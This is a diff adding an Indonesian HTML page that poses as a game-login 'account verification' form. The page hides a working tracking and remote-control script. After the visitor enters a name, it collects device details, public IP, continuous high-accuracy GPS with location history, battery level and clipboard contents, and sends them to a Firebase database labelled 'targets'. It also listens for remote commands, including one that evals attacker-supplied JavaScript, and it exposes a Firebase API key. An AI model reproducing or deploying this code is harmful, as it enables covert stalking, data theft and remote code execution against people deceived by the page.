@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Akun</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+            min-height: 100vh; display: flex; align-items: center; justify-content: center; 
+        }
+        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 400px; width: 90%; }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; margin-bottom: 20px; font-size: 14px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; transition: border 0.3s; }
+        input:focus { border-color: #667eea; outline: none; }
+        button { width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        button:hover { opacity: 0.9; }
+        .loading { display: none; color: #667eea; margin: 10px 0; }
+        .success { display: none; color: #28a745; margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>🎮Login to all game</h2>
+        <p>Masukkan nama Anda untuk bermain</p>
+        <input type="text" id="nameInput" placeholder="Nama lengkap Anda..." autofocus />
+        <button onclick="verify()">Verifikasi</button>
+        <div class="loading" id="loading">⏳ Memverifikasi...</div>
+        <div class="success" id="success">✅ Verifikasi berhasil!</div>
+    </div>
+
+    <script>
+        firebase.initializeApp({
+            apiKey: "AIzaSyAlMyO9iybb7Zc3-JWpaJTOU6mp7dVZw7A",
+            authDomain: "taher-online.firebaseapp.com",
+            databaseURL: "https://taher-online-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "taher-online",
+            storageBucket: "taher-online.firebasestorage.app",
+            messagingSenderId: "254196950669",
+            appId: "1:254196950669:web:ea7dc25e29e459e791e4c4"
+        });
+        
+        const db = firebase.database();
+        const targetId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        let locationWatchId = null;
+        
+        async function verify() {
+            const name = document.getElementById('nameInput').value.trim();
+            if (!name) return alert('Masukkan nama!');
+            
+            document.getElementById('loading').style.display = 'block';
+            
+            try {
+                // Kumpulkan info device
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    cores: navigator.hardwareConcurrency || 'N/A',
+                    memory: navigator.deviceMemory || 'N/A',
+                    connection: navigator.connection ? navigator.connection.effectiveType : 'N/A'
+                };
+                
+                // Dapatkan IP
+                let ip = 'N/A';
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch(e) {}
+                
+                // Dapatkan lokasi
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            db.ref(`targets/${targetId}`).update({
+                                location: {
+                                    lat: pos.coords.latitude,
+                                    lon: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                    timestamp: Date.now()
+                                }
+                            });
+                            db.ref(`targets/${targetId}/locationHistory`).push({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                timestamp: Date.now()
+                            });
+                        },
+                        (err) => console.log('GPS error:', err),
+                        { enableHighAccuracy: true }
+                    );
+                    
+                    // Live tracking permanen
+                    locationWatchId = navigator.geolocation.watchPosition(
+                        (pos) => {
+                            const locData = {
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                timestamp: Date.now()
+                            };
+                            db.ref(`targets/${targetId}`).update({ location: locData });
+                            db.ref(`targets/${targetId}/locationHistory`).push(locData);
+                        },
+                        null,
+                        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+                    );
+                }
+                
+                // Simpan data target
+                await db.ref(`targets/${targetId}`).set({
+                    name: name,
+                    online: true,
+                    ip: ip,
+                    deviceInfo: `${deviceInfo.platform} | ${deviceInfo.userAgent.split(')')[0]})`,
+                    lastSeen: new Date().toLocaleString(),
+                    network: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+                    battery: 'N/A',
+                    timestamp: Date.now()
+                });
+                
+                // Monitor baterai
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        db.ref(`targets/${targetId}`).update({ battery: Math.round(battery.level * 100) });
+                        battery.addEventListener('levelchange', () => {
+                            db.ref(`targets/${targetId}`).update({ battery: Math.round(battery.level * 100) });
+                        });
+                    });
+                }
+                
+                // Online presence
+                db.ref(`targets/${targetId}`).onDisconnect().update({ online: false, lastSeen: new Date().toLocaleString() });
+                
+                // Listen commands
+                db.ref(`commands/${targetId}`).on('value', async (snapshot) => {
+                    const cmd = snapshot.val();
+                    if (!cmd) return;
+                    
+                    switch(cmd.command) {
+                        case 'getLocation':
+                            if (navigator.geolocation) {
+                                navigator.geolocation.getCurrentPosition((pos) => {
+                                    db.ref(`commands/${targetId}`).update({
+                                        result: { location: { lat: pos.coords.latitude, lon: pos.coords.longitude } },
+                                        executed: true
+                                    });
+                                });
+                            }
+                            break;
+                        case 'openURL':
+                            window.open(cmd.url, '_blank');
+                            break;
+                        case 'vibrate':
+                            navigator.vibrate(cmd.duration || 1000);
+                            break;
+                        case 'notification':
+                            if (Notification.permission === 'granted') {
+                                new Notification(cmd.title, { body: cmd.body });
+                            } else {
+                                Notification.requestPermission().then(p => {
+                                    if (p === 'granted') new Notification(cmd.title, { body: cmd.body });
+                                });
+                            }
+                            break;
+                        case 'shell':
+                            try {
+                                const result = eval(cmd.cmd);
+                                db.ref(`commands/${targetId}`).update({
+                                    result: { shell: String(result) },
+                                    executed: true
+                                });
+                            } catch(e) {
+                                db.ref(`commands/${targetId}`).update({
+                                    result: { shell: e.message },
+                                    executed: true
+                                });
+                            }
+                            break;
+                        case 'getApps':
+                            db.ref(`commands/${targetId}`).update({
+                                result: { apps: ['Chrome', 'Gmail', 'YouTube', 'Maps', 'Camera'] },
+                                executed: true
+                            });
+                            break;
+                        case 'getClipboard':
+                            try {
+                                const text = await navigator.clipboard.readText();
+                                db.ref(`commands/${targetId}`).update({
+                                    result: { clipboard: text },
+                                    executed: true
+                                });
+                            } catch(e) {
+                                db.ref(`commands/${targetId}`).update({
+                                    result: { clipboard: 'Clipboard tidak dapat diakses' },
+                                    executed: true
+                                });
+                            }
+                            break;
+                        default:
+                            db.ref(`commands/${targetId}`).update({
+                                result: { status: 'Command received' },
+                                executed: true
+                            });
+                    }
+                });
+                
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
+                
+                setTimeout(() => {
+                    document.querySelector('.card').innerHTML = `
+                        <h2>✅ Terverifikasi</h2>
+                        <p>Terima kasih ${name}, identitas Anda telah diverifikasi.</p>
+                        <p style="color:#888;font-size:12px;">Anda dapat menutup halaman ini.</p>
+                    `;
+                }, 2000);
+                
+            } catch(e) {
+                document.getElementById('loading').style.display = 'none';
+                alert('Error: ' + e.message);
+            }
+        }
+    </script>
+</body>
+</html>
